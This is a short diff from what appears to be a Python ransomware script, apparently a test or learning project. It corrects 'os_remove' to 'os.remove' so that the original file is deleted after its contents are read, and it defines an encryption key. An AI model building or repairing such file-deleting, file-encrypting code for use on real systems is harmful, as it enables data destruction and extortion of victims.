@@ -8,7 +8,7 @@ file_data = file.read()
 file.close()
 
 # Remove original file
-os_remove(file_name)
+os.remove(file_name)
 
 # defining encryption key
 key = b"testeransomwares"
